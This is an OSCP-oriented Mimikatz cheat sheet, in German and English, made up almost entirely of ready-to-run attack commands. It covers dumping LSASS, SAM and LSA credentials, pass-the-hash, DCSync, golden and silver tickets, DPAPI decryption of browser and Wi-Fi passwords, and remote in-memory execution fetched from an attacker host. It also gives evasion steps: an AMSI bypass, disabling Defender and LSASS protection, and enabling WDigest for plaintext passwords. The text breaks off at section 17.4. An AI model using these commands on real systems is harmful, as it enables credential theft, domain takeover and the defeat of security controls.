# Mimikatz - Complete Credential Extraction & Post-Exploitation Guide

## Table of Contents
1. [Installation & Setup](#1-installation--setup)
2. [Basic Concepts](#2-basic-concepts)
3. [Execution Methods](#3-execution-methods)
4. [Privilege Management](#4-privilege-management)
5. [Credential Dumping](#5-credential-dumping)
6. [Kerberos Attacks](#6-kerberos-attacks)
7. [Pass-the-Hash](#7-pass-the-hash)
8. [DCSync Attack](#8-dcsync-attack)
9. [Golden & Silver Tickets](#9-golden--silver-tickets)
10. [DPAPI Extraction](#10-dpapi-extraction)
11. [Remote Execution](#11-remote-execution)
12. [LSASS Dumping](#12-lsass-dumping)
13. [OPSEC Considerations](#13-opsec-considerations)
14. [Common OSCP Patterns](#14-common-oscp-patterns)
15. [Troubleshooting](#15-troubleshooting)
16. [Quick Reference](#16-quick-reference)

---

## 1. Installation & Setup

### 1.1 Download Mimikatz

```bash
# Kali Linux
wget https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip
unzip mimikatz_trunk.zip
cd x64  # Oder x86 für 32-bit

# Windows (PowerShell Download)
IEX (New-Object Net.WebClient).DownloadFile('https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip', 'C:\temp\mimikatz.zip')
Expand-Archive -Path C:\temp\mimikatz.zip -DestinationPath C:\temp\mimikatz
```

### 1.2 Invoke-Mimikatz (PowerShell, kein Binary!)

```powershell
# Download Invoke-Mimikatz.ps1
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1 -O Invoke-Mimikatz.ps1

# In Memory laden
IEX (New-Object Net.WebClient).DownloadString('http://KALI_IP/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds
```

### 1.3 Alternative Tools

```bash
# Pypykatz (Python-basiert, offline LSASS analysis)
pip install pypykatz

# SharpKatz (C# Port)
wget https://github.com/b4rtik/SharpKatz/releases/latest/download/SharpKatz.exe

# SafetyKatz (Dumper + Minidump)
wget https://github.com/GhostPack/SafetyKatz/releases/latest/download/SafetyKatz.exe
```

### 1.4 File Structure

```
mimikatz_trunk/
├── x64/
│   └── mimikatz.exe    # 64-bit Version (verwenden!)
├── x86/
│   └── mimikatz.exe    # 32-bit Version
├── Win32/
└── mimidrv.sys         # Kernel Driver (selten benötigt)
```

---

## 2. Basic Concepts

### 2.1 Was ist Mimikatz?

**Mimikatz** ist ein Post-Exploitation Tool für Windows-Credential-Extraction:
- Extrahiert Klartext-Passwörter aus LSASS
- Dumpt NTLM Hashes
- Kerberos Ticket-Manipulation
- Pass-the-Hash / Pass-the-Ticket
- Golden/Silver Ticket Attacks
- DCSync

**Wichtig für OSCP:** Mimikatz benötigt **Admin-Rechte** oder **SYSTEM**!

### 2.2 Execution Modes

| Mode | Beschreibung | Syntax |
|------|--------------|--------|
| **Interactive** | Interaktive Shell | `mimikatz.exe` |
| **Command** | Einzelner Command | `mimikatz.exe "command"` |
| **Oneliner** | Mehrere Commands | `mimikatz.exe "cmd1" "cmd2" "exit"` |
| **Script** | Script-File | `mimikatz.exe @script.txt` |

### 2.3 Output Format

```
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 123456 (00000000:0001e240)
Session           : Interactive from 1
User Name         : Administrator
Domain            : CORP
Logon Server      : DC01
Logon Time        : 12/19/2024 10:30:00 AM
SID               : S-1-5-21-...
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : CORP
         * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
         * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
        kerberos :
         * Username : Administrator
         * Domain   : CORP.LOCAL
         * Password : Password123!
```

### 2.4 Required Privileges

```powershell
# Check Privileges
mimikatz # privilege::debug
Privilege '20' OK  # SeDebugPrivilege enabled!

# Wenn "ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061"
# → Keine Admin-Rechte!
```

**Benötigte Privileges:**
- `SeDebugPrivilege` - Für LSASS-Zugriff
- Admin oder SYSTEM - Für die meisten Operationen

---

## 3. Execution Methods

### 3.1 Interactive Mode

```powershell
# Mimikatz starten
.\mimikatz.exe

# Commands ausführen
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # exit
```

### 3.2 Single Command

```powershell
# Ein Command, dann Exit
.\mimikatz.exe "privilege::debug"
```

### 3.3 Oneliner (Command Chain)

```powershell
# Mehrere Commands hintereinander
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Mit Output Redirect
.\mm.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > creds.txt
```

### 3.4 Script Mode

```powershell
# Script File (commands.txt):
privilege::debug
sekurlsa::logonpasswords
kerberos::list /export
exit

# Execute Script
.\mimikatz.exe @commands.txt
```

### 3.5 Logging

```powershell
# Output zu File
mimikatz # log output.txt
mimikatz # sekurlsa::logonpasswords
# → Output in output.txt

# Oder direkt:
.\mimikatz.exe "log creds.txt" "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

---

## 4. Privilege Management

### 4.1 Debug Privilege

```powershell
# IMMER zuerst ausführen!
mimikatz # privilege::debug
Privilege '20' OK

# Wenn Fehler:
# → Keine Admin-Rechte
# → In Admin-Shell wechseln
```

### 4.2 Token Management

```powershell
# Current Token anzeigen
mimikatz # token::whoami

# Token elevate (zu SYSTEM)
mimikatz # token::elevate

# Token revert (zurück zu Original)
mimikatz # token::revert

# Token von anderem Process
mimikatz # token::elevate /pid:1234
```

### 4.3 Process Privileges

```powershell
# List Privileges
mimikatz # privilege::debug
mimikatz # token::whoami

# Elevate to SYSTEM
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # token::whoami
# → Sollte "NT AUTHORITY\SYSTEM" zeigen
```

---

## 5. Credential Dumping

### 5.1 Logon Passwords (LSASS)

```powershell
# Hauptbefehl für Credential Dumping!
mimikatz # sekurlsa::logonpasswords

# Zeigt:
# - Klartext-Passwörter (falls WDigest enabled)
# - NTLM Hashes
# - Kerberos Tickets
# - SHA1 Hashes
```

**Output:**
- `Username` - Benutzername
- `Domain` - Domain/Computer
- `NTLM` - NTLM Hash (für Pass-the-Hash!)
- `Password` - Klartext (falls verfügbar)

### 5.2 Credential Manager

```powershell
# Gespeicherte Credentials (Credential Manager)
mimikatz # sekurlsa::credman

# Zeigt:
# - Saved RDP Credentials
# - Browser Passwords
# - Generic Credentials
```

### 5.3 SAM Database

```powershell
# SAM Hash Dump (Local Users)
mimikatz # lsadump::sam

# Zeigt:
# - Local User Accounts
# - NTLM Hashes
# - RIDs
```

**Output Format:**
```
User : Administrator
  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0
```

### 5.4 LSA Secrets

```powershell
# LSA Secrets (Service Account Passwords, Cached Creds)
mimikatz # lsadump::secrets

# Oder mit Inject
mimikatz # lsadump::lsa /inject

# Zeigt:
# - Service Account Passwords
# - Cached Domain Credentials
# - DPAPI Master Keys
# - Auto-Logon Passwords
```

### 5.5 Cached Domain Credentials

```powershell
# Cached Credentials (für Offline-Login)
mimikatz # lsadump::cache

# Zeigt:
# - Domain User Hashes (cached)
# - Für Offline-Cracking mit Hashcat
```

**Hashcat:**
```bash
hashcat -m 2100 cached_creds.txt rockyou.txt
```

---

## 6. Kerberos Attacks

### 6.1 List Kerberos Tickets

```powershell
# Alle Tickets anzeigen
mimikatz # kerberos::list

# Mit Export
mimikatz # kerberos::list /export
# → Tickets als .kirbi Files gespeichert
```

### 6.2 Pass-the-Ticket (PTT)

```powershell
# Ticket exportieren
mimikatz # kerberos::list /export
# → ticket.kirbi erstellt

# Ticket injizieren
mimikatz # kerberos::ptt ticket.kirbi

# Verify
mimikatz # kerberos::list
# → Ticket sollte in Liste sein

# Usage (nach PTT)
# Kali:
impacket-psexec -k dc01.corp.local -no-pass
```

### 6.3 Kerberoasting (Offline)

```powershell
# Tickets bereits mit CrackMapExec/NetExec geholt:
# nxc ldap DC01 -u user -p pass --kerberoasting kerb.txt

# Mimikatz kann auch extrahieren:
mimikatz # kerberos::list /export
# → Suche nach Service Tickets (SPN)

# Offline Crack
hashcat -m 13100 kerberos_tickets.txt rockyou.txt
```

### 6.4 Purge Tickets

```powershell
# Alle Tickets löschen
mimikatz # kerberos::purge

# Nützlich für:
# - Clean Up nach Attack
# - Vor neuem Pass-the-Ticket
```

---

## 7. Pass-the-Hash

### 7.1 Basic Pass-the-Hash

```powershell
# NTLM Hash → CMD Shell
mimikatz # sekurlsa::pth /user:Administrator /domain:CORP /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /run:cmd.exe

# NTLM Hash → PowerShell
mimikatz # sekurlsa::pth /user:admin /domain:CORP /ntlm:HASH /run:powershell.exe
```

**Was passiert:**
1. Mimikatz öffnet neue Shell
2. Shell hat Token mit NTLM Hash
3. Network-Auth nutzt Hash (statt Passwort)

### 7.2 Usage nach PTH

```powershell
# Nach PTH öffnet sich neue Shell:

# Zugriff auf Remote-Share
net use \\DC01\C$ /user:CORP\Administrator

# PSExec
.\PsExec.exe \\DC01 cmd.exe

# WMI
wmic /node:DC01 process call create "cmd.exe"

# PowerShell Remoting
Enter-PSSession -ComputerName DC01
```

### 7.3 PTH mit RC4 (Kerberos)

```powershell
# RC4 = NTLM Hash (im Kerberos-Kontext)
mimikatz # sekurlsa::pth /user:admin /domain:CORP /rc4:NTLM_HASH /run:cmd.exe

# Mit AES Key (stärker!)
mimikatz # sekurlsa::pth /user:admin /domain:CORP /aes256:AES_KEY /run:cmd.exe
```

---

## 8. DCSync Attack

### 8.1 Basic DCSync

```powershell
# Einzelner User
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator

# Output:
# - NTLM Hash
# - LM Hash
# - Kerberos Keys (AES256, AES128, DES)
```

**Requirements:**
- Domain Admin (oder)
- Replication Rights (`DS-Replication-Get-Changes`, `DS-Replication-Get-Changes-All`)

### 8.2 DCSync krbtgt (für Golden Ticket!)

```powershell
# krbtgt Account dumpen (wichtig!)
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt

# Output notieren:
# - NTLM Hash (für Golden Ticket)
# - Domain SID
```

### 8.3 DCSync All Users

```powershell
# ALLE Domain-User dumpen
mimikatz # lsadump::dcsync /domain:corp.local /all

# Output in File
mimikatz # log dcsync_all.txt
mimikatz # lsadump::dcsync /domain:corp.local /all
```

**Alternative (Impacket):**
```bash
impacket-secretsdump 'CORP/Administrator:Password123!@DC01'
```

### 8.4 DCSync Computer Accounts

```powershell
# Computer Account dumpen
mimikatz # lsadump::dcsync /domain:corp.local /user:DC01$

# Nützlich für:
# - Silver Ticket (Computer Services)
# - Pass-the-Hash (Computer Account)
```

---

## 9. Golden & Silver Tickets

### 9.1 Golden Ticket (Domain Admin!)

**Requirements:**
1. Domain SID (via `whoami /user` oder DCSync)
2. krbtgt NTLM Hash (via DCSync)

```powershell
# Golden Ticket erstellen
mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:KRBTGT_NTLM_HASH /user:FakeAdmin /id:500

# Mit ptt (direkt injizieren)
mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /user:FakeAdmin /ptt

# Verify
mimikatz # kerberos::list

# Usage
klist  # Ticket sollte da sein
dir \\DC01\C$  # Sollte funktionieren!
```

**Golden Ticket Features:**
- 10 Jahre gültig (default!)
- Funktioniert auch wenn Password geändert wird
- Domain Admin Rechte überall

### 9.2 Silver Ticket (Service-spezifisch)

**Requirements:**
1. Domain SID
2. Service Account NTLM Hash (z.B. Computer Account)
3. Target Service (z.B. CIFS, HTTP, MSSQL)

```powershell
# Silver Ticket für CIFS (File Share)
mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-... /target:DC01.corp.local /service:cifs /rc4:COMPUTER_ACCOUNT_HASH /user:FakeUser /ptt

# Silver Ticket für HTTP (IIS)
mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-... /target:WEB01.corp.local /service:http /rc4:HASH /user:FakeUser /ptt

# Silver Ticket für MSSQL
mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-... /target:SQL01.corp.local /service:mssql /rc4:HASH /user:FakeUser /ptt
```

**Services:**
- `cifs` - File Shares (SMB)
- `http` - IIS, Web Services
- `mssql` - SQL Server
- `ldap` - LDAP/AD
- `host` - General Host Services

### 9.3 Ticket Export/Import

```powershell
# Ticket zu File exportieren
mimikatz # kerberos::list /export
# → ticket.kirbi erstellt

# Auf andere Maschine kopieren
# Auf Zielmaschine importieren:
mimikatz # kerberos::ptt ticket.kirbi

# Via Rubeus (Alternative)
.\Rubeus.exe ptt /ticket:ticket.kirbi
```

---

## 10. DPAPI Extraction

### 10.1 DPAPI Basics

**DPAPI (Data Protection API)** verschlüsselt:
- Browser Passwords (Chrome, Edge)
- Windows Vault Credentials
- Wireless Passwords
- RDP Credentials

### 10.2 Extract Master Keys

```powershell
# Master Key aus LSASS
mimikatz # sekurlsa::dpapi

# Master Key aus File
mimikatz # dpapi::masterkey /in:"C:\Users\user\AppData\Roaming\Microsoft\Protect\S-1-5-21-...\abc123..."

# Mit System Backup Key (Domain)
mimikatz # lsadump::backupkeys /system:DC01 /export
```

### 10.3 Decrypt Credentials

```powershell
# Chrome Passwords
mimikatz # dpapi::chrome /in:"C:\Users\user\AppData\Local\Google\Chrome\User Data\Default\Login Data"

# Generic Credential
mimikatz # dpapi::cred /in:"C:\Users\user\AppData\Local\Microsoft\Credentials\ABC123"

# Wireless Passwords
mimikatz # dpapi::wifi /in:"C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\{GUID}\Wifi.xml"
```

### 10.4 RDP Saved Credentials

```powershell
# RDP Credential Manager
mimikatz # sekurlsa::credman

# Oder via DPAPI
mimikatz # dpapi::cred /in:"C:\Users\user\AppData\Local\Microsoft\Credentials\*"
```

---

## 11. Remote Execution

### 11.1 Invoke-Mimikatz (PowerShell)

```powershell
# Download + Execute in Memory
IEX (New-Object Net.WebClient).DownloadString('http://KALI_IP/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds

# Mit Output zu File
Invoke-Mimikatz -DumpCreds | Out-File creds.txt

# Command ausführen
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
```

### 11.2 Remote via Invoke-Command

```powershell
# Mimikatz Binary remote
Invoke-Command -ComputerName DC01 -ScriptBlock {
    C:\temp\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
} | Out-File creds.txt

# Invoke-Mimikatz remote
Invoke-Command -ComputerName DC01 -ScriptBlock {
    IEX (New-Object Net.WebClient).DownloadString('http://KALI_IP/Invoke-Mimikatz.ps1')
    Invoke-Mimikatz -DumpCreds
}
```

### 11.3 Via Evil-WinRM

```bash
# Evil-WinRM mit Mimikatz Upload
evil-winrm -i DC01 -u admin -p pass

# In Session:
*Evil-WinRM* PS C:\> upload /root/mimikatz.exe
*Evil-WinRM* PS C:\> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Mit Bypass-AMSI
*Evil-WinRM* PS C:\> menu
*Evil-WinRM* PS C:\> Bypass-4MSI
*Evil-WinRM* PS C:\> IEX(New-Object Net.WebClient).DownloadString('http://KALI/Invoke-Mimikatz.ps1')
*Evil-WinRM* PS C:\> Invoke-Mimikatz -DumpCreds
```

### 11.4 Via CrackMapExec/NetExec

```bash
# Upload Mimikatz
nxc smb DC01 -u admin -p pass --put-file mimikatz.exe C:\\temp\\mimikatz.exe

# Execute
nxc smb DC01 -u admin -p pass -x 'C:\temp\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"'

# Mit Modul (lsassy ist besser!)
nxc smb DC01 -u admin -p pass -M lsassy
```

---

## 12. LSASS Dumping

### 12.1 Task Manager Method

```powershell
# GUI: Task Manager → Details → lsass.exe → Right-click → Create dump file
# → C:\Users\<user>\AppData\Local\Temp\lsass.DMP

# Offline Analysis (Kali):
pypykatz lsa minidump lsass.DMP
```

### 12.2 ProcDump Method

```powershell
# Download Procdump (Sysinternals)
.\procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Mimikatz Offline Analysis
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

### 12.3 Comsvcs.dll Method (Native!)

```powershell
# Get LSASS PID
tasklist | findstr lsass
# lsass.exe    612

# Dump via Comsvcs (Native Windows DLL!)
rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump 612 C:\temp\lsass.dmp full

# Offline Analysis
mimikatz # sekurlsa::minidump C:\temp\lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

### 12.4 Silent Process Exit (Stealthy!)

```powershell
# Registry Setup
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe" /v ReportingMode /t REG_DWORD /d 2 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe" /v LocalDumpFolder /t REG_SZ /d "C:\temp" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe" /v DumpType /t REG_DWORD /d 2 /f

# Trigger Dump
taskkill /f /im lsass.exe
# → lsass wird gekillt + dump erstellt + automatisch neugestartet!
```

### 12.5 Pypykatz (Offline, Kali)

```bash
# LSASS Dump von Windows nach Kali kopieren
# Dann:
pypykatz lsa minidump lsass.dmp

# Output:
# - Usernames
# - Domains
# - NTLM Hashes
# - Kerberos Tickets
# - Plaintext Passwords
```

---

## 13. OPSEC Considerations

### 13.1 Detection Risks

**Mimikatz wird erkannt von:**
- Windows Defender ✅
- EDR/AV (fast alle) ✅
- Event Logs (Event ID 4688, 4103) ✅
- LSASS Access Monitoring ✅

**Indicators:**
- String "mimikatz" in Binary
- LSASS Process Access (SeDebugPrivilege)
- `sekurlsa::logonpasswords` in Memory

### 13.2 Evasion Techniques

```powershell
# 1. Obfuscate Binary
# - String-Replacement (mimikatz → m1m1k4tz)
# - Packen/Crypten (UPX, ConfuserEx)

# 2. In-Memory Execution
IEX(New-Object Net.WebClient).DownloadString('http://KALI/Invoke-Mimikatz.ps1')

# 3. AMSI Bypass (vor Invoke-Mimikatz)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 4. Alternative Tools nutzen
# - SafetyKatz (obfuscated)
# - SharpKatz (C#)
# - Pypykatz (offline)
# - Lsassy (NetExec module)

# 5. LSASS Dump statt Live-Extraction
rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump <PID> lsass.dmp full
# → Offline mit Pypykatz analysieren
```

### 13.3 Stealthy Alternatives

```bash
# Lsassy (via NetExec) - OPSEC-freundlich!
nxc smb DC01 -u admin -p pass -M lsassy

# Nanodump - sehr stealthy
nxc smb DC01 -u admin -p pass -M nanodump

# Procdump (Microsoft-signiert!)
.\procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Comsvcs.dll (Native Windows!)
rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump <PID> lsass.dmp full
```

---

## 14. Common OSCP Patterns

### 14.1 Pattern 1: Basic Credential Dump

```powershell
# Admin Shell auf Target
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > creds.txt

# Parse Output
type creds.txt | findstr /i "username domain ntlm password"
```

### 14.2 Pattern 2: DCSync Attack

```powershell
# Domain Admin Shell
.\mimikatz.exe "lsadump::dcsync /domain:corp.local /user:Administrator" > admin_hash.txt
.\mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" > krbtgt_hash.txt

# Parse Hashes
type admin_hash.txt | findstr /i "hash ntlm"
```

### 14.3 Pattern 3: Pass-the-Hash Lateral Movement

```powershell
# 1. Get Hash
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" | findstr NTLM

# 2. Pass-the-Hash
.\mimikatz.exe "sekurlsa::pth /user:Administrator /domain:CORP /ntlm:HASH /run:powershell.exe"

# 3. In neuer Shell:
Enter-PSSession -ComputerName DC01
```

### 14.4 Pattern 4: Golden Ticket

```powershell
# 1. DCSync krbtgt
.\mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" > krbtgt.txt

# 2. Get Domain SID
whoami /user
# S-1-5-21-123456789-123456789-123456789-500
# Domain SID = S-1-5-21-123456789-123456789-123456789

# 3. Create Golden Ticket
.\mimikatz.exe "kerberos::golden /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /user:FakeAdmin /ptt"

# 4. Verify + Use
klist
dir \\DC01\C$
```

### 14.5 Pattern 5: LSASS Dump → Offline Analysis

```powershell
# === TARGET (Windows) ===
# Get LSASS PID
tasklist | findstr lsass

# Dump LSASS
rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump 612 C:\temp\lsass.dmp full

# Transfer zu Kali
# (via SMB, HTTP, Base64, etc.)
```

```bash
# === KALI ===
# Offline Analysis
pypykatz lsa minidump lsass.dmp

# Extract Hashes
pypykatz lsa minidump lsass.dmp | grep -i ntlm > hashes.txt
```

### 14.6 Pattern 6: Remote Invoke-Mimikatz

```powershell
# Kali: HTTP Server
python3 -m http.server 80

# Target: Download + Execute
IEX (New-Object Net.WebClient).DownloadString('http://KALI_IP/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds | Out-File creds.txt

# Parse
type creds.txt
```

### 14.7 Pattern 7: Kerberos Ticket Export

```powershell
# Export alle Tickets
.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"

# → *.kirbi Files erstellt

# Auf Kali konvertieren (für Impacket)
impacket-ticketConverter ticket.kirbi ticket.ccache

# Use Ticket
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass dc01.corp.local
```

### 14.8 Pattern 8: Full Auto-Dump Script

```powershell
# === auto_dump.ps1 ===
# LSASS Dump
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > logon.txt

# SAM Dump
.\mimikatz.exe "privilege::debug" "lsadump::sam" "exit" > sam.txt

# LSA Secrets
.\mimikatz.exe "privilege::debug" "lsadump::secrets" "exit" > secrets.txt

# Kerberos Tickets
.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit" > tickets.txt

# Parse wichtige Infos
findstr /i "username domain ntlm password" logon.txt sam.txt secrets.txt > summary.txt

Write-Host "[+] Dump complete! Check summary.txt"
```

---

## 15. Troubleshooting

### 15.1 "ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege"

```
Fehler: privilege::debug
ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061
```

**Lösung:**
- Keine Admin-Rechte!
- In Admin-Shell wechseln:
```powershell
# Check ob Admin
net session

# Neue Admin-Shell
powershell -ep bypass
Start-Process powershell -Verb RunAs
```

### 15.2 "ERROR kuhl_m_sekurlsa_acquireLSA"

```
Fehler: sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
```

**Ursachen:**
1. Keine Admin-Rechte
2. LSASS Protected Process
3. Credential Guard enabled

**Lösungen:**
```powershell
# 1. Check Admin
whoami /groups | findstr "S-1-16-12288"

# 2. Check LSASS Protection
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL

# 3. Disable Protection (benötigt Reboot!)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 0 /f

# 4. Alternative: LSASS Dump
rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump <PID> lsass.dmp full
```

### 15.3 Windows Defender blockiert Mimikatz

```
Windows Defender hat mimikatz.exe gelöscht/blockiert
```

**Lösungen:**
```powershell
# 1. Defender deaktivieren (Admin!)
Set-MpPreference -DisableRealtimeMonitoring $true

# 2. Exclusion hinzufügen
Add-MpPreference -ExclusionPath "C:\temp"

# 3. In-Memory Execution (kein File!)
IEX (New-Object Net.WebClient).DownloadString('http://KALI/Invoke-Mimikatz.ps1')

# 4. Alternative Tools
nxc smb localhost -u admin -p pass -M lsassy

# 5. Obfuscation
# → Binary mit UPX packen oder Strings ändern
```

### 15.4 Keine Klartext-Passwörter

```
sekurlsa::logonpasswords zeigt nur Hashes, keine Passwords
```

**Ursache:** WDigest disabled (Windows 10+)

**Lösung:**
```powershell
# WDigest aktivieren (benötigt Reboot!)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1 /f

# Reboot
shutdown /r /t 0

# Nach Reboot + User-Login:
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"
# → Klartext-Passwörter sollten da sein
```

**Alternative:** Nutze NTLM Hashes (Pass-the-Hash funktioniert immer!)

### 15.5 DCSync fehlschlägt

```
ERROR kuhl_m_lsadump_dcsync ; GetNCChanges
```

**Ursachen:**
1. Keine Domain Admin Rechte
2. Keine Replication Rights
3. Falscher Domain-Name

**Lösungen:**
```powershell
# 1. Check DA Rights
net group "Domain Admins" /domain

# 2. Check Replication Rights
# → Benötigt "Replicating Directory Changes" Permission

# 3. Richtiger Domain Name
# FQDN verwenden!
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator

# 4. Alternative: Impacket
impacket-secretsdump 'CORP/admin:pass@DC01'
```

---

## 16. Quick Reference

### 16.1 Essential Commands

```powershell
# === PRIVILEGE ===
privilege::debug              # Enable debug privilege
token::elevate                # Elevate to SYSTEM
token::revert                 # Revert token

# === CREDENTIAL DUMPING ===
sekurlsa::logonpasswords      # Dump LSASS credentials
sekurlsa::credman             # Credential Manager
lsadump::sam                  # SAM hashes
lsadump::secrets              # LSA Secrets
lsadump::cache                # Cached domain credentials

# === KERBEROS ===
kerberos::list                # List tickets
kerberos::list /export        # Export tickets to .kirbi
kerberos::ptt ticket.kirbi    # Pass-the-Ticket

# === DCSYNC ===
lsadump::dcsync /domain:DOMAIN /user:USER        # Sync single user
lsadump::dcsync /domain:DOMAIN /user:krbtgt      # Get krbtgt hash
lsadump::dcsync /domain:DOMAIN /all              # Sync all users

# === PASS-THE-HASH ===
sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:HASH /run:cmd.exe

# === GOLDEN TICKET ===
kerberos::golden /domain:DOMAIN /sid:SID /krbtgt:HASH /user:USER /ptt

# === SILVER TICKET ===
kerberos::golden /domain:DOMAIN /sid:SID /target:TARGET /service:SERVICE /rc4:HASH /user:USER /ptt

# === DPAPI ===
sekurlsa::dpapi               # Extract DPAPI keys
dpapi::cred /in:FILE          # Decrypt credential
dpapi::chrome                 # Chrome passwords

# === LSASS MINIDUMP ===
sekurlsa::minidump lsass.dmp  # Load minidump
sekurlsa::logonpasswords      # Extract from dump

# === MISC ===
log file.txt                  # Log to file
exit                          # Quit mimikatz
```

### 16.2 Oneliners

```powershell
# Basic Dump
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Full Dump
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::secrets" "exit" > full_dump.txt

# DCSync Administrator
.\mimikatz.exe "lsadump::dcsync /domain:corp.local /user:Administrator" "exit"

# DCSync krbtgt
.\mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" "exit"

# Export Kerberos Tickets
.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"

# Pass-the-Hash
.\mimikatz.exe "sekurlsa::pth /user:admin /domain:CORP /ntlm:HASH /run:cmd.exe"

# Golden Ticket
.\mimikatz.exe "kerberos::golden /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /user:FakeAdmin /ptt"

# LSASS Minidump
.\mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"
```

### 16.3 Command Categories

| Category | Commands |
|----------|----------|
| **Privilege** | `privilege::debug`, `token::elevate`, `token::revert` |
| **LSASS** | `sekurlsa::logonpasswords`, `sekurlsa::credman` |
| **SAM** | `lsadump::sam`, `lsadump::secrets`, `lsadump::cache` |
| **Kerberos** | `kerberos::list`, `kerberos::ptt`, `kerberos::purge` |
| **DCSync** | `lsadump::dcsync` |
| **PTH** | `sekurlsa::pth` |
| **Tickets** | `kerberos::golden` (Golden/Silver Ticket) |
| **DPAPI** | `sekurlsa::dpapi`, `dpapi::cred`, `dpapi::chrome` |
| **Minidump** | `sekurlsa::minidump` |

### 16.4 Output Parsing

```powershell
# NTLM Hashes extrahieren
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" | findstr /i "ntlm"

# Usernames
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" | findstr /i "username"

# Passwords (Klartext)
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" | findstr /i "password"

# Domains
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" | findstr /i "domain"

# Alles wichtige
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" | findstr /i "username domain ntlm password"
```

---

## 17. Alternative Tools

### 17.1 Pypykatz (Python)

```bash
# Installation
pip install pypykatz

# LSASS Dump analysieren
pypykatz lsa minidump lsass.dmp

# Registry Dump
pypykatz registry --sam sam.hive --system system.hive
```

### 17.2 SharpKatz (C#)

```powershell
# Kompiliert für .NET
.\SharpKatz.exe --Command logonpasswords

# LSASS Dump
.\SharpKatz.exe --Command sekurlsa::logonpasswords
```

### 17.3 SafetyKatz

```powershell
# SafetyKatz (Mimikatz + PELoader)
.\SafetyKatz.exe "sekurlsa::logonpasswords"
```

### 17.4 Lsassy (NetExec)

```bash
# Via NetExec (am besten für OSCP!)
